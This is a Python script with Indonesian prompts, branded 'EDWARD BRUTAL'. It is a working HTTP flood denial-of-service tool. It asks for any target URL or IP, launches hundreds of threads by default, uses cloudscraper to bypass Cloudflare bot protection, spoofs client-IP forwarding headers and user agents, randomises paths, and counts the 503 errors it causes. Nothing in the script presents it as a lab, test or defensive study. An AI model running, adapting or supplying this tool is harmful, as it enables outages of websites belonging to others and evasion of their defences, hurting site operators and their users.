#!/usr/bin/env python3
import os
import sys
import time
import random
import threading
import socket
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse
import cloudscraper
from fake_useragent import UserAgent

if os.geteuid() != 0:
    print("[!] Harus dijalankan sebagai ROOT")
    sys.exit(1)

ua = UserAgent()
scraper = cloudscraper.create_scraper(
    browser={'browser': 'chrome', 'platform': 'windows', 'mobile': False}
)

stats = {
    "sent": 0,
    "failed": 0,
    "hit_503": 0,
    "lock": threading.Lock()
}

def update_stats(success=True, is_503=False):
    with stats["lock"]:
        if success:
            stats["sent"] += 1
            if is_503:
                stats["hit_503"] += 1
        else:
            stats["failed"] += 1

def generate_headers():
    fake_ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
    return {
        "User-Agent": ua.random,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9,id;q=0.8",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
        "Upgrade-Insecure-Requests": "1",
        "X-Forwarded-For": fake_ip,
        "X-Real-IP": fake_ip,
        "CF-Connecting-IP": fake_ip,
        "X-Originating-IP": fake_ip,
        "X-Remote-IP": fake_ip,
        "X-Remote-Addr": fake_ip,
        "True-Client-IP": fake_ip,
        "Via": f"1.1 {fake_ip}",
        "Referer": random.choice([
            "https://www.google.com/",
            "https://www.facebook.com/",
            "https://twitter.com/",
            "https://www.bing.com/"
        ])
    }

def build_target(target):
    if target.startswith("http://") or target.startswith("https://"):
        return target.rstrip("/")
    if ":" in target:
        ip, port = target.split(":")
        return f"http://{ip}:{port}"
    return f"http://{target}"

def random_path():
    paths = [
        "/", "/index.php", "/home", "/login", "/search", "/api", "/admin",
        "/wp-login.php", "/wp-admin", "/user", "/product", "/cart",
        f"/search?q={random.randint(10000,99999)}",
        f"/page?id={random.randint(1,9999)}",
        f"/api/v1/data?token={random.randint(100000,999999)}"
    ]
    return random.choice(paths)

def brutal_attack(base_url, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            path = random_path()
            url = base_url + path
            headers = generate_headers()
            r = scraper.get(url, headers=headers, timeout=4, verify=False, allow_redirects=False)
            is_503 = r.status_code == 503
            update_stats(success=True, is_503=is_503)
            if is_503:
                print(f"\033[92m[503 HIT]\033[0m {url}")
        except Exception:
            update_stats(success=False)

def realtime_monitor(duration):
    start = time.time()
    while time.time() - start < duration:
        elapsed = max(1, time.time() - start)
        sent = stats["sent"]
        failed = stats["failed"]
        hit = stats["hit_503"]
        rps = int(sent / elapsed)
        print(f"\r\033[96m[EDWARD BRUTAL]\033[0m SENT: {sent:,} | FAILED: {failed:,} | 503: {hit:,} | RPS: {rps}   ", end="", flush=True)
        time.sleep(0.8)
    print()

def main():
    os.system("clear")
    print("""
\033[91m
███████╗██████╗ ██╗    ██╗ █████╗ ██████╗ ██████╗ 
██╔════╝██╔══██╗██║    ██║██╔══██╗██╔══██╗██╔══██╗
█████╗  ██║  ██║██║ █╗ ██║███████║██████╔╝██║  ██║
██╔══╝  ██║  ██║██║███╗██║██╔══██║██╔══██╗██║  ██║
███████╗██████╔╝╚███╔███╔╝██║  ██║██║  ██║██████╔╝
╚══════╝╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ 
\033[0m
          \033[93mBRUTAL MODE - SINGLE VECTOR\033[0m
          Target: URL atau IP:PORT
""")

    target_input = input("\033[92m[Target]\033[0m URL / IP / IP:PORT > ").strip()
    if not target_input:
        print("Target kosong!")
        sys.exit(1)

    threads = input("\033[92m[Thread]\033[0m Jumlah thread (default 800) > ").strip()
    threads = int(threads) if threads.isdigit() else 800

    duration = input("\033[92m[Durasi]\033[0m Detik (default 180) > ").strip()
    duration = int(duration) if duration.isdigit() else 180

    base_url = build_target(target_input)
    print(f"\n\033[93m[*] Target   : {base_url}\033[0m")
    print(f"\033[93m[*] Threads  : {threads}\033[0m")
    print(f"\033[93m[*] Duration : {duration} detik\033[0m")
    print(f"\033[93m[*] Mode     : BRUTAL (CF Bypass + Header Spoof + Random Path)\033[0m")
    print("\033[91m[*] Serangan dimulai...\033[0m\n")

    with ThreadPoolExecutor(max_workers=threads) as executor:
        for _ in range(threads):
            executor.submit(brutal_attack, base_url, duration)
        realtime_monitor(duration)

    print("\n\033[92m[EDWARD] Serangan selesai.\033[0m")
    print(f"Total SENT   : {stats['sent']:,}")
    print(f"Total FAILED : {stats['failed']:,}")
    print(f"Total 503    : {stats['hit_503']:,}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\033[91m[!] Dihentikan oleh user\033[0m")
        sys.exit(0)